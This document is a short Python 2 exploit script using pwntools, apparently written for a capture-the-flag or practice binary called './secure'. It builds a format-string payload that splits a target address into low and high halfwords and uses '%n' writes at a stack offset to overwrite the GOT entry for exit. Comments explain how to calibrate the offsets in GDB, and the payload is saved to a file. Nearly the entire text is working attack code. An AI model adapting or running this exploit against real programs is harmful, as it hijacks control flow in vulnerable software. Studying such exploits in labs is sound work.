#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

elf = ELF('./secure')

# These are the addresses in memory that you want to overwrite
overwite = elf.got['exit'] # this is the value that you want to OVERWRITE...
to_write = 0x08048713 # this is the value that you want TO OVERWRITE IT WITH...

# These values come from testing in GDB....
first_difference = 16 # this is the value you see replacing the GOT entry after you test it
                      # (the hex value you see overwriting GOT subtracted from your test value)
second_difference = 0x8731 # this is the value you see the SECOND time you test high






LOW_BYTES = str(hex(to_write)[-4:])
LOW_BYTES_DIFFERENCE = int(LOW_BYTES,16) - first_difference

HIGH_BYTES = '1'+hex(to_write)[2:-4].zfill(4)
print HIGH_BYTES, int(HIGH_BYTES, 16) 
HIGH_BYTES_DIFFERENCE = int(HIGH_BYTES, 16) - second_difference + 30
print HIGH_BYTES_DIFFERENCE


def pad(s):
    return s + "X" * ( 64 - len(s) )

# This is the offset of our buffer on the stack. (the position of AAAA for testing)
offset = 35

exploit = ""
exploit += p32(elf.got['exit'])      # this will be filled with the LOW BYTES DIFFERENCE...
exploit += p32(elf.got['exit'] + 2)  # this will be filled with the HIGH BYTES...
exploit += 'BBBBCCCC'
exploit += '%'+str(offset)+'$'+str(LOW_BYTES_DIFFERENCE)+'x' # used for padding...
exploit += '%'+str(offset)+'$n' # used to write the value!
exploit += '%'+str(offset+1)+'$'+str(HIGH_BYTES_DIFFERENCE)+'x' # used for padding...
exploit += '%'+str(offset+1)+'$n' # used to write the value!


open('payload','w').write("\n".join(['password', pad(exploit), 'password','']))

